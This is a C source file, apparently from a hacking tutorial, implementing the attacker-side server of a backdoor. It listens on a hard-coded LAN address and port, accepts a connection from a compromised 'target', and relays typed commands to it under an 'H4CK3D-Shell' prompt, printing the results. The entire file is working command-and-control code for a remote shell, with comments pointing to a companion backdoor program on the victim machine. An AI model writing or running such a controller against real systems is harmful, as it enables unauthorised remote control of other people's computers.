#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h> //for the socket
#include <netinet/in.h> //for the sockaddr
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() //only to create/listen connections  or send and recieve commands and responses.
{
	int sock, client_socket; //since we are the server, we have our own socket. We connect to the client and also store the client's socket.
	char buffer[1024]; //to transport commands
	char response[18384]; //exact same size from that of backdoor variable
	struct sockaddr_in server_address, client_address; //in backdoor, we created only one socket object cuz it was for the target machine. Since we are the server mc we need to have information about both the sockets.
	int i=0;
	int optval = 1;
	socklen_t client_length;
	
	sock = socket(AF_INET, SOCK_STREAM, 0); //af_inet for connecting to our ip address and sock_stream for the TCP connection, 0 to specify that we don't need any other parameter in the function call.
	
	if ( setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0 ) //This if condition is used to check if our socket object has worked. If this value is zero then something is wrong while setting the socket object and the program is exited
	{
		printf("Error setting TCP Socket Options!\n");
		return 1;
	}
	
	server_address.sin_family = AF_INET; //we need to set up the server address family ie. the server ip and port no of the connection
	server_address.sin_addr.s_addr = inet_addr("192.168.1.8");
	server_address.sin_port = htons(50005);
	
	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)); //this is program that the server will run, so it is important to bind the server ip and server port
	listen(sock, 5); //to listen on the specified socket and the amount of connections we want to accept, here 5
	client_length = sizeof(client_address); //takes the length of the client address
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length); //accepting connection requests using accept fn and storing them in a client socket; structure of the socket address pointing to the memory location of client address
	
	while(1)
	{
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("H4CK3D-Shell# %s~$: ", inet_ntoa(client_address.sin_addr));
		//a prompt to the user of server to input a command to send to the target
		//inet_ntoa takes %s string from the target and in this case the target's ip address is being taken using sin_addr.
		fgets(buffer, sizeof(buffer), stdin);
		//the input commands of the user of server is getting stored in the buffer.
		strtok(buffer, "\n"); //to remove \n from the commands
		write(client_socket, buffer, sizeof(buffer)); //sending commands to the target from our buffer.
		
		//Now we check if the buffer == q, we quit and close.
		//Else we will receive the responses from the target.
		if(strncmp("bye", buffer, 1 )== 0){
			printf("Terminating Connection!");
			break;
		}
		else{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);	
		}
	}
}
